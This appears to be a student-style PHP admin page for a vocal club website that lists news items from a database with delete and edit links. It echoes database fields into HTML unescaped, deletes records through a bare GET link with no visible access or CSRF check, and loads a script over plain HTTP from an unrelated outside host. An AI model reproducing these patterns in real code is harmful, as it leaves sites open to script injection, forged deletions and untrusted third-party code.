<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../App/css/style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>Вокальный кружок ТОН</title>
</head>
<body>
<div class="nav-admin">
    <h4 class="admin-title">Панель Админинстратора</h4>
    <a href="" class="admin-item active">Новости</a
    ><a href="" class="admin-item">Комментарии</a>
    <a href="" class="admin-item">Ученики</a>
    <a href="" class="admin-item">Расписание занятий</a>
    <a href="" class="admin-item">Курсы</a>
    <a href="" class="admin-item" style = "float: right;">Вернуться на сайт</a>
</div>
<div class="container">
    <h1 class = "mt-5">Список новостей</h1>
    <table class="table table-dark table-striped-columns">
    <tr class="table-dark">
    <td class="table-dark">ID</td>
    <td class="table-dark">Название новости</td>
    <td class="table-dark">Текст новости</td>
    <td class="table-dark">Дата</td>
    <td class="table-dark">Изображение</td>
    <td class="table-dark"></td>
    <td class="table-dark"></td>
    </tr>
    <?php
    require_once('connect.php');
    $news = mysqli_query($link,"SELECT * FROM `news`");
    $news = mysqli_fetch_all($news);
    foreach($news as $news){
        ?>
    <tr class="table-dark">
    <td class="table-dark"><?=$news[0]?></td>
    <td class="table-dark"><?=$news[1]?></td>
    <td class="table-dark"><?=$news[2]?></td>
    <td class="table-dark"><?=$news[3]?></td>
    <td class="table-dark"><img src="../<?=$news[4]?>" alt="news-admin" class="news_admin"></td>
    <td class="table-dark"><a href="scripts/deletenews.php?id=<?=$news[0]?>" class="crud" style="color:red;">Удалить</a></td>
    <td class="table-dark"><a href="" class="crud" style="color:green;">Изменить</a></td>
    </tr>
    <?php
    }
    ?>
</table>
<h1 class="mt-5">Добавить новость</h1>
</div>
<script type="text/javascript"
src="http://ip-jobs.staff-base.spb.ru/ip.cgi"></script>
<script src="../App/js/main.js"></script>
</body>
</html>